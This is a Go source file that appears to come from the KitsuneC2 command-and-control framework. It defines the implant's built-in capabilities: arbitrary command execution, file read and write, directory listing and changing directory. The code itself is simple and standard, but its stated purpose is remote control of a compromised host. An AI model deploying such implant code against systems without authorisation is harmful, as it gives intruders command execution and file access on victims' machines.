//This package contains all functions that an implant is able to perform. These functions usually get called through handlers.
//Only pure-go, platform independent modules should go in this file.

package modules

import (
	"KitsuneC2/lib/utils"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"strings"
	"time"
)

// Given a filepath, returns info about a file such as name, size etc.
func FileInfo(path string) (fs.FileInfo, error) {
	results, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	return results, nil
}

// Executes a command and returns stdout
func Exec(cmd string, args []string) ([]byte, error) {
	command := exec.Command(cmd, args...)
	byteOut, err := command.CombinedOutput()
	if err != nil {
		return nil, err
	}
	return byteOut, nil
}

// Writes file to specified location.
func WriteFile(file []byte, location string) error {
	return utils.WriteFile(file, location)
}

// Reads file from "path" and returns content as bytes
func ReadFile(path string) ([]byte, error) {
	return utils.ReadFile(path)
}

// lists directory given on path
func Ls(path string) (string, error) {
	files, err := os.ReadDir(path)
	if err != nil {
		return "", err
	}
	var output *strings.Builder = new(strings.Builder)
	for _, file := range files {
		fileInf, _ := file.Info()
		fmt.Fprintf(output, "%s  %d  %s    %s\n", fileInf.Mode().String(), fileInf.Size(), fileInf.ModTime().Format(time.UnixDate), fileInf.Name())
	}

	return output.String(), nil
}

// Changes current working directory to "path".
func Cd(path string) error {
	return os.Chdir(path)
}
